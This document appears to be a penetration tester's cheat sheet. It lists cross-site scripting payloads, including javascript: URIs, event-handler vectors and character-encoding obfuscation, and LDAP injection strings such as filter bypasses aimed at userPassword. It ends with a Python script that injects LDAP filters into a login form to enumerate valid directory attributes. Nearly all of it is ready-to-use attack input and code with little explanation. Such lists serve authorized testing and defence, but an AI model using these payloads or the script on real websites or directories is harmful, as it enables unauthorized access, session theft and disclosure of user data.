xss cheat sheet:

1.Image XSS using the JavaScript directive
<IMG SRC="javascript:alert('XSS');">
2.No quotes and no semicolon:
<IMG SRC=javascript:alert('XSS')>
3.Case insensitive XSS attack vector:
<IMG SRC=JaVaScRiPt:alert('XSS')>
4.Grave accent obfuscation:
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
5.fromCharCode:
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
6.
<IMG SRC=# onmouseover="alert('xxs')">
<IMG onmouseover="alert('xxs')">
<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
7.Decimal HTML character references:
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
------------------------------------------------------------------------------------------------------------------

test for LDAP injection:

The Lightweight Directory Access Protocol (LDAP) is used to store information about:
 users, hosts, and many other objects
 LDAP injection is a server side attack,
 which could allow sensitive information about users and hosts represented in an LDAP structure to be disclosed, modified, or inserted. 
Payloads:
*
*)(&
*))%00
)(cn=))\x00
*()|%26'
*()|&'
*(|(mail=*))
*(|(objectclass=*))
*)(uid=*))(|(uid=*
*/*
*|
/
//
//*
@*
|
admin*
admin*)((|userpassword=*)
admin*)((|userPassword=*)
x' or name()='username' or 'x'='y

Defaults attributes:
Can be used in an injection like *)(ATTRIBUTE_HERE=*:
userPassword
surname
name
cn
sn
objectClass
mail
givenName
commonName

Scripts
Discover valid LDAP fields:

#!/usr/bin/python3

import requests
import string

fields = []

url = 'https://URL.com/'

f = open('dic', 'r') #Open the wordlists of common attributes
wordl = f.read().split('\n')
f.close()

for i in wordl:
    r = requests.post(url, data = {'login':'*)('+str(i)+'=*))\x00', 'password':'bla'}) #Like (&(login=*)(ITER_VAL=*))\x00)(password=bla))
    if 'TRUE CONDITION' in r.text:
        fields.append(str(i))

print(fields)
-------------------------------------------------------------------------------------------------------


